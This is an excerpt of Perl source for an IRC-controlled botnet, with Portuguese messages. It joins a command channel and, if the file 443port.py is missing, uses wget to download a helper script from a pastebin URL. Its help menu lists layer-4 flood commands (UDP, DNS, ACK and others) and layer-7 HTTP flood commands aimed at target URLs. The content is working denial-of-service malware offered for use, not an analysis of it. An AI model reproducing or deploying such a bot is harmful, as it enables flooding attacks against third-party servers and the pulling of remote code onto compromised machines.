...
my $server  = "irc.mibbit.net"; 
my $code = int(rand(100000));
my $channel = "#Lousgrande";
my $port    =   "6667";
my $nick    = "Solder_$code";

unless (-e "443port.py") {
  print "[*] Instalando o 443port...";
  system("wget https://pastebin.com/raw/sJVuTYSH -O 443port.py");
}
...
while ( my $log = <$s0ck3t> ) {
   ...
   if ( $log =~ m/:!ufo (.*)$/g ){##########
     ...
     if ( $log =~ m/:!help/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 Métodos de ataque layer 4 Botnet:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !udp ip / !stopudp\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !std ip port time / !stopstd\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !rand ip time / !stoprand\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !dns ip time / !stopdns\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !ack ip time / !stopack\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !ufo ip time / !stopack\r\n";
        print $s0ck3t "PRIVMSG $channel :67\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 Métodos de ataque layer 7 Botnet:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !sadattack http://wwww.google.com/ / !stopsad\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !hulk http://www.google.com/ / !stophulk\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !gold http://www.google.com.br / !stopgold\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Lousgrande67]61 !httpabuse http://www.google.com / !stopabuse\r\n";
      }
